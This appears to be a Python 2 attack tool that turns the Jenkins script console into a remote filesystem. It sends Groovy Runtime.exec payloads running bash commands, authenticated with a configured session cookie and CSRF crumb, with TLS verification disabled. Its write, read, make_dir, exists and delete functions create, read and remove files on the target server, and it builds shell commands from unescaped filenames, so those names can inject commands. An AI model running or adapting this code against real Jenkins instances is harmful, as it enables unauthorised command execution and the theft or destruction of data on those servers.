import requests
from urllib import quote
from base64 import b64decode, b64encode
import yaml

print("[+] Loading configuration for Jenkins from YAML file")
# load config from file
with open('./config.yaml','r') as stream:
    config = yaml.safe_load(stream)

URL = config["URL"] + "/script"
cookies = {config["JSESSIONID_cookie_name"]: config["JSESSIONID_cookie_value"]}
Jenkins_Crumb = config["Jenkins_Crumb"]
if config.has_key("proxies"):
    proxies = config['proxies']
else:
    proxies = {}

payload = """Jenkins-Crumb=""" + Jenkins_Crumb + """&Submit=Run&script="".class.forName("java.lang.Runtime").getRuntime().exec("/bin/bash@-c@{command}".split("@")).text"""

headers={'Content-Type':'application/x-www-form-urlencoded'}

def write(filename,data):
    """
    writes data to file using the implemented method
    creates the file if the file does not exist
    if the file exists it appends to its content

    :param filename: full path to the file to write
    :type filename: string
    :param data: data to be written to file
    :type data: string
    :return:
    """

    dataToSend = b64encode(data)
    cmd = 'echo '+dataToSend + ' > ' + "'" + filename + "'"
    requests.post(URL,data=payload.format(command = quote(cmd.replace('"','\\"'))), headers=headers, proxies=proxies, cookies=cookies, verify=False)

    '''f = open(filename,'w')
    f.write(data)
    f.flush()
    f.close()'''


def read(filename):
    """
    Reads the data from filename
    :param filename: absolute path to file to read
    :type filename: string
    :return: content of read file
    """
    cmd = 'cat ' + "'" + filename + "'"
    res = requests.post(URL,data=payload.format(command = quote(cmd.replace('"','\\"'))), headers=headers, proxies=proxies, cookies=cookies, verify=False)

    return b64decode(res.text[res.text.find("Result:")+6:res.text.find('''</pre></div></div><footer><div class="container-fluid"''')])
    #return open(filename,'r+').read()


def make_dir(dirname):
    """
    Creates a directory
    :param dirname: full path to the directory to create
    :return:
    """

    cmd = 'mkdir ' + dirname
    requests.post(URL,data=payload.format(command = quote(cmd.replace('"','\\"'))), headers=headers, proxies=proxies, cookies=cookies, verify=False)

    #os.mkdir(dirname)


def exists(filename):
    """
    checks weather a directory or file of filename exists
    :param filename: full path to filename to check the existence of
    :return: boolean
    """

    cmd = 'ls -d ' + "'" + filename + "'"
    res = requests.post(URL,data=payload.format(command = quote(cmd.replace('"','\\"'))), headers=headers, proxies=proxies, cookies=cookies, verify=False)

    cmd_res = res.text[res.text.find("Result:")+6:res.text.find('''</pre></div></div><footer><div class="container-fluid"''')]

    if filename in cmd_res:
        return True
    else:
        return False


def delete(filename):
    """
    Deletes file
    :param filename: absolute path to file to delete.
    :return:
    """

    cmd = 'rm ' + "'" + filename + "'"
    res = requests.post(URL,data=payload.format(command = quote(cmd.replace('"','\\"'))), headers=headers, proxies=proxies, cookies=cookies, verify=False)



